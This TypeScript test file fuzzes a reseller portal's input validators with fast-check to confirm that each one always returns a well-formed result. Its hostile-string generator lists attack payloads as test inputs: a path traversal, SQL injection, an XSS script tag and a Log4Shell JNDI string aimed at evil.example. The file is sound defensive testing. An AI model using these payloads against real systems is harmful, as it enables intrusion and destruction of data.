// Feature: admin-reseller-portal, Property 33: Client input is validated before use
//
// Validates: Requirements 15.4
//
// Every exported validator in lib/validation.ts is TOTAL: for arbitrary and
// hostile input it always returns a well-formed discriminated result
// `{ ok: true, value } | { ok: false, error }`. It never throws, never returns
// undefined/null, and rejected inputs always carry a string `error`. Accepted
// inputs always carry a defined `value`. This guarantees client input is
// validated (never used raw) before being consumed by the rest of the portal.

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import fc from "fast-check";
import {
  validateLicenseKey,
  validateMaxActivations,
  validateIso8601Utc,
  validateStatus,
  validateReleaseUrl,
  validateChecksum,
  validateSeoTitle,
  validateSeoDescription,
  validateApiKey,
  validateEmailOtp,
} from "../lib/validation.ts";

// The full set of exported validators. Each accepts `unknown` and returns a Result.
const VALIDATORS: ReadonlyArray<readonly [string, (input: unknown) => unknown]> = [
  ["validateLicenseKey", validateLicenseKey],
  ["validateMaxActivations", validateMaxActivations],
  ["validateIso8601Utc", validateIso8601Utc],
  ["validateStatus", validateStatus],
  ["validateReleaseUrl", validateReleaseUrl],
  ["validateChecksum", validateChecksum],
  ["validateSeoTitle", validateSeoTitle],
  ["validateSeoDescription", validateSeoDescription],
  ["validateApiKey", validateApiKey],
  ["validateEmailOtp", validateEmailOtp],
];

/**
 * Asserts that a value is a well-formed validator Result:
 *   - it is a non-null object
 *   - `ok` is a boolean
 *   - when ok === true: it has a defined `value` and no `error`
 *   - when ok === false: `error` is a string and there is no `value`
 */
function assertWellFormedResult(name: string, result: unknown): void {
  assert.ok(
    result !== null && result !== undefined,
    `${name} returned null/undefined`
  );
  assert.strictEqual(typeof result, "object", `${name} did not return an object`);

  const r = result as Record<string, unknown>;
  assert.strictEqual(typeof r.ok, "boolean", `${name} result.ok is not a boolean`);

  if (r.ok === true) {
    assert.ok(
      "value" in r && r.value !== undefined,
      `${name} accepted an input but returned an undefined value`
    );
    assert.ok(!("error" in r), `${name} success result should not carry an error`);
  } else {
    assert.strictEqual(
      typeof r.error,
      "string",
      `${name} rejection did not carry a string error`
    );
    assert.ok(
      (r.error as string).length > 0,
      `${name} rejection error string was empty`
    );
    assert.ok(!("value" in r), `${name} failure result should not carry a value`);
  }
}

// A generator of hostile / adversarial string inputs that an attacker or
// malformed client might submit. These exercise regex edge cases, injection-ish
// payloads, unicode, control characters, and pathological lengths.
const hostileString = fc.oneof(
  fc.constant(""),
  fc.constant(" ".repeat(10)),
  fc.constant("\u0000\u0000\u0000"),
  fc.constant("\n\t\r"),
  fc.constant("../../etc/passwd"),
  fc.constant("'; DROP TABLE licenses; --"),
  fc.constant("<script>alert(1)</script>"),
  fc.constant("${jndi:ldap://evil.example/x}"),
  fc.constant("PDM-" + "\uFFFF".repeat(16)),
  fc.constant("https://" + "a".repeat(5000) + ".s3.amazonaws.com/x"),
  fc.constant("x".repeat(100000)),
  fc.constant("\uD800"), // lone surrogate
  fc.constant("𝕏𝕏𝕏𝕏"), // astral-plane characters
  fc.string(),
  fc.string({ unit: "binary" }),
  fc.string({ unit: "grapheme" })
);

describe("Property 33: Client input is validated before use", () => {
  for (const [name, validate] of VALIDATORS) {
    // Totality over completely arbitrary values: no matter what JS value is fed
    // in, the validator returns a well-formed Result and never throws.
    it(`${name} is total over arbitrary input (never throws, always well-formed)`, () => {
      fc.assert(
        fc.property(fc.anything(), (value) => {
          let result: unknown;
          assert.doesNotThrow(() => {
            result = validate(value);
          }, `${name} threw on arbitrary input`);
          assertWellFormedResult(name, result);
        }),
        { numRuns: 100 }
      );
    });

    // Totality over hostile strings: adversarial payloads are handled safely and
    // always produce a well-formed Result.
    it(`${name} handles hostile string input without throwing`, () => {
      fc.assert(
        fc.property(hostileString, (value) => {
          let result: unknown;
          assert.doesNotThrow(() => {
            result = validate(value);
          }, `${name} threw on hostile string input`);
          assertWellFormedResult(name, result);
        }),
        { numRuns: 100 }
      );
    });
  }

  // Cross-validator invariant: for any single arbitrary input, EVERY validator
  // simultaneously returns a well-formed Result. This models the guarantee that
  // whatever field a client submits, it is routed through a total validator
  // before use.
  it("every validator returns a well-formed result for the same arbitrary input", () => {
    fc.assert(
      fc.property(fc.anything(), (value) => {
        for (const [name, validate] of VALIDATORS) {
          let result: unknown;
          assert.doesNotThrow(() => {
            result = validate(value);
          }, `${name} threw on shared arbitrary input`);
          assertWellFormedResult(name, result);
        }
      }),
      { numRuns: 100 }
    );
  });
});
